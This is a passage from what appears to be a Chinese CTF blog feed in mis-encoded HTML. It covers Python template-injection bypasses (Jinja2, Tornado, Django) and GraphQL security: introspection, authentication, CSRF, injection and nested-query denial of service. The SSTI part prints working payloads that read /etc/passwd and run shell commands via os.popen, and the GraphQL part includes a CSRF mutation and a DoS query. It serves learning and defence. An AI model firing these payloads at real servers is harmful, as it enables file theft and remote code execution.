&lt;h3 id="è¿‡æ»¤_">è¿‡æ»¤&lt;code>_&lt;/code>&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;code>request.args&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>{{&amp;#39;&amp;#39;[request.args.class][request.args.base][request.args.subclasses]()[index](&amp;#39;/etc/passwd&amp;#39;).read() }}&lt;span style="color:#960050;background-color:#1e0010">&amp;amp;&lt;/span>class=__class__&lt;span style="color:#960050;background-color:#1e0010">&amp;amp;&lt;/span>base=__base__&lt;span style="color:#960050;background-color:#1e0010">&amp;amp;&lt;/span>subclasses=__subclasses__
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™ç§æ–¹å¼å¯ä»¥ç»“åˆgetå’Œpostï¼Œä¸¾ä¾‹-&amp;gt;&lt;a href="https://qgieod1s9b.feishu.cn/docs/doccnNEAk0zZJDhi7bypQhF6eFf#RYhszr">[CTFshow å‡»å‰‘æ¯]é€šå…³å¤§ä½¬&lt;/a>ï¼Œåœ¨ä¸åŒçš„å­—æ®µå¤„å¯¹ä¼ å…¥å‚æ•°çš„é™åˆ¶æ˜¯ä¸åŒçš„&lt;/p>
&lt;pre tabindex="0">&lt;code>/edit?a=__init__&amp;amp;b=__globals__&amp;amp;c=__getitem__&amp;amp;d=os&amp;amp;e=popen&amp;amp;f=whoami&amp;amp;g=read
POST: name={%25set%20r=request.args%25}&amp;amp;rank=1&amp;amp;speech={{(config|attr(r.a)|attr(r.b))|attr(r.c)(r.d)|attr(r.e)(r.f)|attr(r.g)()}}&amp;amp;time=2021å¹´11æœˆ11æ—¥
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>æŒ‰å­—ç¬¦ä¸²çš„æ–¹å¼èµ°ï¼Œä¹Ÿå¯&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="è¿‡æ»¤-3">è¿‡æ»¤&lt;code>{&lt;/code>&lt;/h3>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">{{}}&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="è¿‡æ»¤-">è¿‡æ»¤&lt;code> &lt;/code>&lt;/h3>
&lt;ul>
&lt;li>&lt;code>+&lt;/code>æ›¿ä»£&lt;/li>
&lt;/ul>
&lt;h2 id="å…¶å®ƒå§¿åŠ¿">å…¶å®ƒå§¿åŠ¿&lt;/h2>
&lt;h3 id="çŸ­çŸ­çŸ­">çŸ­çŸ­çŸ­&lt;/h3>
&lt;p>åˆ©ç”¨çš„æ˜¯Flaskä¸­çš„&lt;code>config&lt;/code>å¯¹è±¡ï¼Œå®ƒå¯ä»¥å­˜å‚¨ä¸€éƒ¨åˆ†è®¾ç½®é¡¹çš„å†…å®¹ï¼›&lt;code>config.update&lt;/code>æ–¹æ³•å¯ä»¥ç”¨æ¥å­˜å‚¨è®¾ç½®é¡¹ä¸­çš„å˜é‡ï¼Œç”¨æ³•æ˜¯&lt;code>config.update(key=value)&lt;/code>&lt;/p>
&lt;p>è¿™é‡Œç”¨ä¸€ä¸ªé¢˜åšä¾‹å­ï¼ŒæŒ‡è·¯-&amp;gt;&lt;a href="https://amiaaaz.github.io/2021/10/22/digitaloverdosectf2021-wp/#webmadlib">[Digital Overdose 2021 Autumn CTF madlib]&lt;/a>&lt;/p>
&lt;h3 id="pwn---åŠ«æŒgotè¡¨getshell">***pwn - åŠ«æŒgotè¡¨getshell&lt;/h3>
&lt;p>pwnï¼Œåœ¨å­¦äº†åœ¨å­¦äº†ï¼ŒæŒ‡æ–°å»ºæ–‡ä»¶å¤¹å’Œmdæ–‡æ¡£ğŸ˜…&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://ctf-wiki.org/pwn/sandbox/python/python-sandbox-escape/">Python æ²™ç®±é€ƒé€¸&lt;/a>&lt;/p>
&lt;h1 id="tornado">Tornado&lt;/h1>
&lt;p>Tornadoä¹Ÿæ˜¯ä¸€ç§æ¨¡æ¿ï¼Œå¯ä»¥æ‰§è¡Œç®€å•çš„è¡¨è¾¾å¼å’Œä¼ é€’å˜é‡ï¼Œå½“å‚æ•°å¯æ§æ—¶å¯èƒ½é€ æˆxsså’Œrce&lt;/p>
&lt;h2 id="å†…ç½®å­—å…¸å¯¹è±¡">å†…ç½®å­—å…¸å¯¹è±¡&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>&lt;code>handler.settings&lt;/code> æŒ‡å‘çš„æ˜¯RequestHandler.application.settings&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>{{handler.settings}}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{{escape(handler.settings[&amp;#34;cookie&amp;#34;])}}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>æŸ¥çœ‹å…¨å±€å˜é‡&lt;/p>
&lt;pre tabindex="0">&lt;code>{{globals}}
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h2 id="æ‰§è¡Œä»£ç ">æ‰§è¡Œä»£ç &lt;/h2>
&lt;p>tornadoæ”¯æŒä¸‰ç§sstiæ ‡ç­¾&lt;/p>
&lt;pre tabindex="0">&lt;code>{{xxx}} å¯æ‰§è¡Œä»»æ„pyä»£ç å’Œtornadoå†…ç½®å¯¹è±¡
{%xxx%} ä¸‹é¢å±•å¼€è¯´
{#xxx#} ä½œä¸ºæ³¨é‡Š å†…éƒ¨è¯­å¥ä¸æ‰§è¡Œ
&lt;/code>&lt;/pre>&lt;p>&lt;code>{%%}&lt;/code>ä¸­çš„è¯­å¥æ”¶åˆ°é™åˆ¶ï¼Œæ ¼å¼ä¸º&lt;code>{%æ“ä½œå å‚æ•°%}&lt;/code>ï¼Œæ“ä½œåæœ‰è¿™äº›&lt;/p>
&lt;pre tabindex="0">&lt;code>applyã€autoescapeã€blockã€commentã€extendsã€forã€fromã€ifã€importã€includeã€moduleã€rawã€setã€tryã€whileã€whitespace
&lt;/code>&lt;/pre>&lt;p>å…¶ä¸­çš„&lt;code>raw&lt;/code>ï¼Œå¯ä»¥æ‰§è¡ŒåŸç”Ÿpyä»£ç &lt;/p>
&lt;pre tabindex="0">&lt;code>{%raw eval(&amp;#39;3-1&amp;#39;)%}
&lt;/code>&lt;/pre>&lt;p>&lt;code>extends&lt;/code>å¯ä»¥æ¥æ”¶æ–‡ä»¶è·¯å¾„ä½œä¸ºå‚æ•°æ¥åŒ…å«æ–‡ä»¶ï¼Œå¦‚æœè¯¥æ–‡ä»¶æœ¬èº«å­˜åœ¨æ¶æ„çš„ssti payloadï¼Œé‚£å°†ä¼šè¢«æ‰§è¡Œ&lt;/p>
&lt;p>ï¼ˆæ —å­å¯å‚è§ [QWB2021 Quals]æ‰˜çº³å¤šï¼Œç»“åˆäº†sqlæ³¨å…¥+sqlæ–‡ä»¶å†™å…¥&lt;/p>
&lt;h1 id="django">Django&lt;/h1>
&lt;p>Djangoæ˜¯ä¸€ä¸ªpythonçš„webæ¡†æ¶ï¼Œç›¸æ¯”flaskæ¯”è¾ƒåºå¤§ä¸€ç‚¹ç‚¹ï¼›pç‰›çš„è¿™ç¯‡æ–‡ç« -&amp;gt;&lt;a href="https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html">Python æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼ˆDjangoä¸ºä¾‹ï¼‰&lt;/a>æŒ‡å‡ºäº†ä¸€ç§åˆ©ç”¨æ€è·¯ï¼Œé€šè¿‡Djangoé»˜è®¤çš„adminçš„modelæ¥è·å–settingså¯¹è±¡ï¼Œè¿›è€Œè·å–æ•°æ®åº“è´¦å·å¯†ç ã€webåŠ å¯†å¯†é’¥ç­‰ä¿¡æ¯&lt;/p>
&lt;hr>
&lt;p>ä¸¤å‘¨ä¹‹å‰åŸºæœ¬æ€»ç»“è¿‡äº†ï¼Œä½†æ˜¯å‰ä¸¤å¤©é‡åˆ°è¦æ„é€ çš„å…·ä½“åœºæ™¯è¿˜æ˜¯æ‰“ä¸ç©¿ï¼Œäºæ˜¯åˆæ‹äº†ä¸€éåˆ©ç”¨çš„æ€è·¯ï¼ŒæŠŠç¬”è®°æ•´ç†å‡ºæ¥äº†&lt;/p>
&lt;p>è¿™ä¸ªæ•…äº‹å‘Šè¯‰æˆ‘ä»¬å­¦ä¸œè¥¿è¦æ‰å®ï¼Œæ›´æ‰å®ä¸€ç‚¹ï¼Œä¸ç„¶ä¼šå¾ˆè›‹ç–¼&lt;/p></description></item><item><title>GraphQLå­¦ä¹ ç¬”è®°</title><link>https://amiaaaz.github.io/2021/09/03/graphql-study-notes/</link><pubDate>Fri, 03 Sep 2021 20:56:54 +0800</pubDate><guid>https://amiaaaz.github.io/2021/09/03/graphql-study-notes/</guid><description>&lt;h2 id="graphqlç®€è¿°">GraphQLç®€è¿°&lt;/h2>
&lt;p>GraphQLæ˜¯ä¸€ç§é’ˆå¯¹Graphï¼ˆå›¾çŠ¶æ•°æ®ï¼‰æŸ¥è¯¢å¾ˆæœ‰ä¼˜åŠ¿çš„Query Languageï¼ˆæŸ¥è¯¢è¯­è¨€ï¼‰ï¼Œè€Œæ¶‰åŠåˆ°å­˜å‚¨æ—¶å¯ä»¥é€‰æ‹©NoSQL, SQLæˆ–å…¶å®ƒä»»æ„å­˜å‚¨æ–¹å¼ï¼ˆä¾‹å¦‚æ–‡æœ¬æ–‡ä»¶ã€å­˜å†…å­˜é‡Œç­‰ï¼‰ï¼›è¿™æ˜¯ä¸€é—¨ä¾¿äºå‰åç«¯äº¤äº’çš„è¯­è¨€ï¼Œè€Œä¸æ˜¯ä¾¿äºåç«¯å’Œæ•°æ®åº“äº¤äº’çš„è¯­è¨€ã€‚&lt;/p>
&lt;p>åº”ç”¨GraphQLçš„ä¸€ä¸ªå¾ˆé‡è¦çš„å‰ææ˜¯åç«¯æ•°æ®å·²ç»ä»¥å›¾çš„ç»“æ„è¿›è¡Œä¿å­˜ï¼Œï¼ˆå¹¶ä¸”ä¸€å®šæƒ…å†µä¸‹å·²ç»è®¾ç½®å¥½åŸºäºéšç§çš„è®¿é—®æ§åˆ¶ æˆæƒä¸é‰´æƒï¼Œå¦åˆ™ä¼šç›´æ¥è¢«æ”»å‡»è€…æ‰§è¡Œé«˜å±æ“ä½œï¼‰ã€‚æ¯æ¬¡æŸ¥è¯¢æˆ–æ›´æ–°éƒ½æœ‰è‡ªå·±çš„æ ¹èŠ‚ç‚¹ï¼Œå¾—åˆ°çš„æ•°æ®æ˜¯æ ‘çŠ¶ç»“æ„ï¼›å¦‚æœå¸Œæœ›ä»¥å›¾çš„å½¢å¼å±•ç¤ºåˆ™å‰ç«¯ä¸èƒ½ç®€å•çš„å¯¹å…¶è¿›è¡Œç¼“å­˜ï¼Œé‚£å¿…é¡»ä½¿ç”¨ç›¸åº”çš„å­˜å‚¨æ•°æ®åº“ï¼Œé€šè¿‡é¡¶ç‚¹çš„IDæŠŠä¸åŒèŠ‚ç‚¹ä¹‹é—´çš„æŸäº›è¾¹é‡æ–°è¿æ¥èµ·æ¥ã€‚&lt;/p>
&lt;p>å¹¶ä¸æ˜¯æ‰€æœ‰åœºæ™¯éƒ½éœ€è¦è¿ç§»åˆ°GraphQLï¼Œå¦‚æœRESTful APIå·²ç»èƒ½æ»¡è¶³éœ€æ±‚çš„è¯ã€‚&lt;/p>
&lt;blockquote>
&lt;p>&lt;a href="https://twitter.com/jlouis666/status/1018140132153667584">GraphQL is basically just sugar for a simply typed lambda calculus.&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;h3 id="å˜æ›´---mutations">å˜æ›´ - Mutations&lt;/h3>
&lt;blockquote>
&lt;p>&lt;a href="https://medium.com/@HurricaneJames/graphql-mutations-fb3ad5ae73c4">three important things:&lt;/a>&lt;/p>
&lt;p>mutations are just queries in different namespace, but do NOT mix them;&lt;/p>
&lt;p>arguments require Input Objects, not normal Objects;&lt;/p>
&lt;p>use xyzAttributes for anything you want to link, then let your backend sort out how to do the linking(just like any other system we currently use)&lt;/p>
&lt;/blockquote>
&lt;h3 id="å†…çœ---introspection">å†…çœ - introspection&lt;/h3>
&lt;p>GraphQL å…è®¸åœ¨æŸ¥è¯¢çš„ä»»ä½•ä½ç½®è¯·æ±‚ &lt;code>__typename&lt;/code>ï¼Œä¸€ä¸ªå…ƒå­—æ®µ(Meta fields)ï¼Œä»¥è·å¾—é‚£ä¸ªä½ç½®çš„å¯¹è±¡ç±»å‹åç§°ã€‚&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902180824151.png" alt="image-20210902180824151">&lt;/p>
&lt;p>æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡æŸ¥è¯¢ &lt;code>__schema&lt;/code> å­—æ®µæ¥å‘ GraphQL è¯¢é—®å“ªäº›ç±»å‹æ˜¯å¯ç”¨çš„ï¼Œç±»å‹æœ‰ä»¥ä¸‹è¿™äº›ï¼š&lt;/p>
&lt;ul>
&lt;li>Query, Character, Human, Episode, Droid - è¿™äº›æ˜¯æˆ‘ä»¬åœ¨ç±»å‹ç³»ç»Ÿä¸­å®šä¹‰çš„ç±»å‹ã€‚&lt;/li>
&lt;li>String, Boolean - è¿™äº›æ˜¯å†…å»ºçš„æ ‡é‡ï¼Œç”±ç±»å‹ç³»ç»Ÿæä¾›ã€‚&lt;/li>
&lt;li>&lt;code>__Schema&lt;/code>, &lt;code>__Type&lt;/code>, &lt;code>__TypeKind&lt;/code>, &lt;code>__Field&lt;/code>, &lt;code>__InputValue&lt;/code>, &lt;code>__EnumValue&lt;/code>, &lt;code>__Directive&lt;/code> - è¿™äº›æœ‰ç€ä¸¤ä¸ªä¸‹åˆ’çº¿çš„ç±»å‹æ˜¯å†…çœç³»ç»Ÿçš„ä¸€éƒ¨åˆ†ã€‚&lt;/li>
&lt;/ul>
&lt;h2 id="æ•æ„Ÿä¿¡æ¯æ³„éœ²è¶Šæƒ">æ•æ„Ÿä¿¡æ¯æ³„éœ²&amp;amp;è¶Šæƒ&lt;/h2>
&lt;p>è‡ªåŠ¨æ–‡æ¡£ç”Ÿæˆ/è§£æ - &lt;a href="https://github.com/2fd/graphdoc">graphdoc&lt;/a> | &lt;a href="https://github.com/graphql/graphql-playground">graphql-playground&lt;/a> | &lt;a href="https://apis.guru/graphql-voyager/">graphql-voyager&lt;/a> &amp;hellip;&amp;hellip;&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902183558042.png" alt="image-20210902183558042">&lt;/p>
&lt;p>ç”±äºå¯¹å¯¹è±¡æˆ–å±æ€§çš„æƒé™æ§åˆ¶ä¸å®Œå–„ï¼Œå¯¼è‡´ä¿¡æ¯æ³„éœ²ï¼Œæ¡ˆä¾‹ï¼š&lt;a href="https://hackerone.com/reports/310946">hackerone ä¸€ç³»åˆ—ä¿¡æ¯æ³„éœ²æ¼æ´&lt;/a>&lt;/p>
&lt;p>åœ¨objects.typesä¸­å¯»æ‰¾æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚email, password, secretkey, token, licensekey, sessionç­‰ï¼Œå¤šå¤šå…³æ³¨åºŸå¼ƒå­—æ®µï¼ˆdeprecated fields)ã€‚å½“å­—æ®µè¢«åºŸå¼ƒåç›´æ¥ç”¨&lt;code>__type&lt;/code>åšå†…çœç¡®å®æŸ¥æ‰¾ä¸åˆ°ï¼Œä½†å½“æŒ‡å®š&lt;code>includeDreprecated: true&lt;/code>æ—¶ï¼Œ&lt;code>__type&lt;/code>ä»ç„¶å¯ä»¥å°†åºŸå¼ƒå­—æ®µæš´éœ²å‡ºæ¥ã€‚&lt;/p>
&lt;h2 id="graphqlçš„è®¤è¯æ–¹å¼">GraphQLçš„è®¤è¯æ–¹å¼&lt;/h2>
&lt;p>GraphQLå¹¶æ²¡æœ‰è§„å®šä»»ä½•èº«ä»½è®¤è¯å’Œæƒé™æ§åˆ¶çš„ç›¸å…³å†…å®¹ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ›´çµæ´»çš„åœ¨åº”ç”¨ä¸­å®ç°å„ç§ç²’åº¦çš„è®¤è¯å’Œæƒé™ï¼›ä½†æ˜¯ä¹Ÿå¾ˆå®¹æ˜“å†™å‡ºä¸€äº›â€œè£¸å¥”â€çš„æ¥å£æˆ–æ— æ•ˆè®¤è¯æ— æ•ˆçš„æ¥å£ã€‚&lt;/p>
&lt;h3 id="ç‹¬ç«‹è®¤è¯ç»ˆç«¯-restful">ç‹¬ç«‹è®¤è¯ç»ˆç«¯ (RESTful)&lt;/h3>
&lt;p>é€šç”¨ä¸”å®˜æ–¹æ¨èçš„æ–¹å¼ï¼Œå¦‚æœåç«¯æœ¬èº«æ”¯æŒRESTfulæˆ–æœ‰ä¸“é—¨çš„è®¤è¯æœåŠ¡å™¨ï¼Œå¯ä»¥ä¿®æ”¹å°‘é‡ä»£ç å®ç°GraphQLæ¥å£çš„è®¤è¯ã€‚&lt;/p>
&lt;p>ä¸¾ä¾‹ï¼šæ·»åŠ jwtè®¤è¯&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902200434456.png" alt="image-20210902200434456">&lt;/p>
&lt;h3 id="åœ¨graphqlå†…è®¤è¯">åœ¨GraphQLå†…è®¤è¯&lt;/h3>
&lt;p>å¦‚æœGraphQLçš„åç«¯æ”¯æŒGraphQLä¸èƒ½æ”¯æŒRESTfulï¼Œæˆ–å…¨éƒ¨è¯·æ±‚éƒ½éœ€è¦ä½¿ç”¨GraphQLï¼Œä¹Ÿå¯ä»¥ç”¨æ„é€ ç›¸å…³çš„Query Schemaæ¥å£è¿”å›tokençš„å½¢å¼ã€‚&lt;/p>
&lt;p>ä¸¾ä¾‹ï¼šæ„é€ loginçš„Query Schemaï¼Œåœ¨è¿”å›å€¼ä¸­æºå¸¦token&lt;/p>
&lt;pre tabindex="0">&lt;code>type Query{
login(
username: String!
password: String!
): LoginMsg
type LoginMsg{
message: String
token: String
}
}
&lt;/code>&lt;/pre>&lt;p>åœ¨resolverä¸­æä¾›ç™»å½•é€»è¾‘&lt;/p>
&lt;pre tabindex="0">&lt;code>import bcrypt from &amp;#39;bcrptjs&amp;#39;;
import jsonwebtoken from &amp;#39;jsonwebtoken&amp;#39;;
export const login = async(_, args, context) =&amp;gt; {
const db = await context.getDb();
const{username, password} = args;
const user = await db.collection(&amp;#39;User&amp;#39;).findOne({username: username});
if(await bcyrpt.compare(password, user.password)){
return{
message: &amp;#39;Login success&amp;#39;,
token: jsonwebtoken.sign({
user: user,
exp: Math.floor(Date.now() / 1000) + (60 * 60),
}, &amp;#39;your secret&amp;#39;),
};
}
}
&lt;/code>&lt;/pre>&lt;p>ç™»å½•æˆåŠŸå æˆ‘ä»¬æŠŠtokenè®¾ç½®åœ¨è¯·æ±‚å¤´ä¸­ï¼Œç»§ç»­è¯·æ±‚GraphQLçš„å…¶ä»–æ¥å£ï¼Œè¿™æ—¶éœ€è¦å¯¹ApolloServerè¿›è¡Œå¦‚ä¸‹é…ç½®&lt;/p>
&lt;pre tabindex="0">&lt;code>const server = new ApolloServer({
typeDefs: schemaText,
resolvers: resolverMap,
context: ({ ctx }) =&amp;gt; {
const token = ctx.req.headers.authorization || &amp;#39;&amp;#39;;
const user = getUser(token);
return{
...user,
...ctx,
...app.context
};
},
});
&lt;/code>&lt;/pre>&lt;p>å®ç°getUserå‡½æ•°&lt;/p>
&lt;pre tabindex="0">&lt;code>const getUser = (token) =&amp;gt; {
let user = null;
const parts = token.split(&amp;#39; &amp;#39;);
if(parts.length === 2){
const scheme = parts[0];
const credentials = parts[1];
if(/^Bearer$/i.test(scheme)){
token = credentials;
try{
user = jwt.verify(token, JWT_SECRET);
console.log(user);
}catch(e){
console.log(e);
}
}
}
return user
}
&lt;/code>&lt;/pre>&lt;p>é…ç½®å¥½ApolloServeråï¼Œåœ¨resolverä¸­æ ¡éªŒuser&lt;/p>
&lt;pre tabindex="0">&lt;code>import {ApolloError, ForbiddenError, AuthenticationError} from &amp;#39;apollo-server&amp;#39;;
export const blogs = async(_, args, context) =&amp;gt; {
const db = await context.getDb();
const user = context.user;
if(!user){
throw new AuthenticationError(&amp;#39;You must be logged in to see blogs&amp;#39;);
}
const {blogId} = args;
const cursor = {}ï¼›
if(blogId){
cursor[&amp;#39;_id&amp;#39;] = blogId;
}
const blogs = await db
.collection(&amp;#39;blogs&amp;#39;)
.find(cursor)
.sort({publishedAt: -1})
.toArray();
return blogs;
}
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902203603699.png" alt="image-20210902203603699">&lt;/p>
&lt;h2 id="æ›´å¤šå®‰å…¨æ¼æ´">æ›´å¤šå®‰å…¨æ¼æ´&lt;/h2>
&lt;p>Express-GraphQLï¼š&lt;/p>
&lt;ul>
&lt;li>æ¡†æ¶é»˜è®¤æ— é˜²æŠ¤&lt;/li>
&lt;li>è‡ªå¸¦GraphiQL&lt;/li>
&lt;/ul>
&lt;p>Graphene-Djangoï¼š&lt;/p>
&lt;ul>
&lt;li>ä¾èµ–Djangoçš„å®‰å…¨é…ç½®ï¼ˆSecure As Defaultï¼‰&lt;/li>
&lt;li>è‡ªå¸¦GraphiQL&lt;/li>
&lt;/ul>
&lt;p>GraphQL-PHP&lt;/p>
&lt;ul>
&lt;li>æ— å…³æ¡†æ¶&lt;/li>
&lt;/ul>
&lt;h3 id="express-graphql-endpoint-csrfæ¼æ´">Express-GraphQL Endpoint CSRFæ¼æ´&lt;/h3>
&lt;pre tabindex="0">&lt;code>{&amp;#34;query&amp;#34;:&amp;#34;mutation {\n editProfile(name:\&amp;#34;hacker\&amp;#34;, age: 5) {\n name\n age\n }\n}&amp;#34;,&amp;#34;variables&amp;#34;:null}
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902205831949.png" alt="image-20210902205831949">&lt;/p>
&lt;p>å°†Content-Typeä¿®æ”¹ä¸ºapplication/x-www-form-urlencodeï¼Œä»å¯æˆåŠŸæ‰§è¡Œ&lt;/p>
&lt;pre tabindex="0">&lt;code>query=mutation%20%7B%0A%20%20editProfile(name%3A%22hacker%22%2C%20age%3A%20
5)%20%7B%0A%20%20%20%20name%0A%20%20%20%20age%0A%20%20%7D%0A%7D
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902210011480.png" alt="image-20210902210011480">&lt;/p>
&lt;p>ç›´æ¥é…åˆburpè‡ªå¸¦çš„Generate CSRD POC&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902210221214.png" alt="image-20210902210221214">&lt;/p>
&lt;h3 id="graphiql-clickjacking-æ¼æ´">GraphiQL Clickjacking æ¼æ´&lt;/h3>
&lt;p>å‚è§ï¼šhttps://github.com/graphql/graphiql/issues/683&lt;/p>
&lt;p>å¯ä»¥é…åˆburpè‡ªå¸¦çš„Clickbanditè¿›è¡Œæ”»å‡»&lt;/p>
&lt;h3 id="graphql-injection-æ¼æ´">GraphQL injection æ¼æ´&lt;/h3>
&lt;p>&lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection#enumerate-database-schema-via-introspection">è¿™æ˜¯ä¸€ä¸ªç›¸å½“å…¨çš„payloads&amp;amp;exps&lt;/a> | &lt;a href="https://gist.github.com/craigbeck/b90915d49fda19d5b2b17ead14dcd6da">è¿™æ˜¯ä¸€ä¸ªè‡ªçœpayload&lt;/a>&lt;/p>
&lt;p>pç¥ppté‡Œçš„ç¤ºæ„å›¾ç›´æ¥æ¬è¿‡æ¥äº†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902211535481.png" alt="image-20210902211535481">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902211551814.png" alt="image-20210902211551814">&lt;/p>
&lt;p>ä»ç„¶æ˜¯æ‹¼æ¥äº†æ¶æ„çš„GraphQLè¯­å¥å¯¼è‡´æ¼æ´çš„å‘ç”Ÿï¼Œæœ¬è´¨è¿˜æ˜¯å¯¹ç”¨æˆ·è¾“å…¥çš„æ§åˆ¶ä¸ä¸¥æ ¼ï¼›åŒç±»çš„æ¼æ´è¿˜æœ‰xss, rceç­‰ç­‰&lt;/p>
&lt;blockquote>
&lt;p>&lt;a href="https://www.freebuf.com/articles/web/184040.html">æœ‰è¯­æ³•å°±æœ‰è§£æï¼Œæœ‰è§£æå°±ä¼šæœ‰ç»“æ„å’Œé¡ºåºï¼Œæœ‰ç»“æ„å’Œé¡ºåºå°±ä¼šæœ‰æ³¨å…¥ã€‚&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>ç”¨â€œå‚æ•°åŒ–æŸ¥è¯¢â€çš„æ–¹å¼æ¥è§£å†³ä¸Šè¿°é—®é¢˜æ—¶ï¼Œè¦ç¡®ä¿åç«¯çš„è§£æå¼•æ“æ²¡æœ‰å¤§ç—…&lt;/p>
&lt;h3 id="é€šè¿‡custom-scalarçš„æ³¨å…¥-json">é€šè¿‡Custom Scalarçš„æ³¨å…¥ (JSON)&lt;/h3>
&lt;blockquote>
&lt;p>&lt;a href="http://www.petecorey.com/blog/2017/06/12/graphql-nosql-injection-through-json-types/">NoSQL Injection is entirely possible when using GraphQL, and can creep into your application through the use of &amp;lsquo;custom scalar types&amp;rsquo;&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>â€”â€”â€”â€”æ›´å¤šçš„GraphQLiç›¸å…³é—®é¢˜å¯å‚è§&lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection#enumerate-database-schema-via-introspection">è¿™ä¸ªgitä»“åº“&lt;/a>ï¼Œä¸€æœ¬æ»¡è¶³ï¼ˆ&lt;/p>
&lt;h3 id="æ‹’ç»æœåŠ¡">æ‹’ç»æœåŠ¡&lt;/h3>
&lt;p>GraphQLä¸­çš„queryå’Œmutationçš„è¿”å›ç»“æœéƒ½æ˜¯å¯ä»¥æœ‰åµŒå¥—çš„å¯¹è±¡çš„ï¼Œå¦‚æœä¸å¯¹åµŒå¥—æ·±åº¦è¿›è¡Œé™åˆ¶ï¼Œæœ‰å¯èƒ½è¢«åˆ©ç”¨ä»è€Œè¿›è¡Œæ‹’ç»æœåŠ¡æ”»å‡»ã€‚&lt;/p>
&lt;p>ä¸€ä¸ªä¸¾ä¾‹ï¼š&lt;/p>
&lt;p>å®šä¹‰äº†Blogå’ŒAuthor:&lt;/p>
&lt;pre tabindex="0">&lt;code>type Blog{
_id: String!
type: BlogType
avatar: String
title: String
content: [String]
author: Author
....
}
type Author{
_id: String!
name: String
blog: [Blog]
}
&lt;/code>&lt;/pre>&lt;p>éƒ½æœ‰å„è‡ªçš„Query:&lt;/p>
&lt;pre tabindex="0">&lt;code>extend type Query{
blogs(
blogId: ID
systemType: String!
): [Blog]
}
extend type Query{
author(
_id: String
): Author
}
&lt;/code>&lt;/pre>&lt;p>æˆ‘ä»¬å¯ä»¥æ„é€ è¿™æ ·çš„æŸ¥è¯¢ï¼Œæ— é™å¥—å¨ƒå¯¼è‡´dos&lt;/p>
&lt;pre tabindex="0">&lt;code>query GetBlogs($blogId: ID, $systemType: String!) {
blogs(blogId: $blogId, systemType: $systemType) {
_id
title
type
content
author {
name
blog {
author {
name
blog {
author {
name
blog {
author {
name
blog {
author {
name
blog {
author {
name
blog {
author {
name
blog {
author {
name
# and so on...
}
}
}
}
}
}
}
}
}
}
}
}
}
title
createdAt
publishedAt
}
}
publishedAt
}
}
&lt;/code>&lt;/pre>&lt;p>è§£å†³è¿™ä¸ªé—®é¢˜æˆ‘ä»¬éœ€è¦åœ¨GraphQLæœåŠ¡å™¨ä¸Šé™åˆ¶æŸ¥è¯¢æ·±åº¦ï¼ŒåŒæ—¶è®¾è®¡GraphQLæ¥å£æ—¶å°½é‡é¿å…å‡ºç°æ­¤ç±»é—®é¢˜ï¼Œä»¥Node.jsä¸ºä¾‹ï¼Œgraphql-depth-limitå°±å¯ä»¥è§£å†³è¿™æ ·çš„é—®é¢˜&lt;/p>
&lt;pre tabindex="0">&lt;code>// ...
import depthLimit from &amp;#39;graphql-depth-limit&amp;#39;;
// ...
const server = new ApolloServer({
typeDefs: schemaText,
resolvers: resolverMap,
context: ({ ctx }) =&amp;gt; {
const token = ctx.req.headers.authorization || &amp;#39;&amp;#39;;
const user = getUser(token);
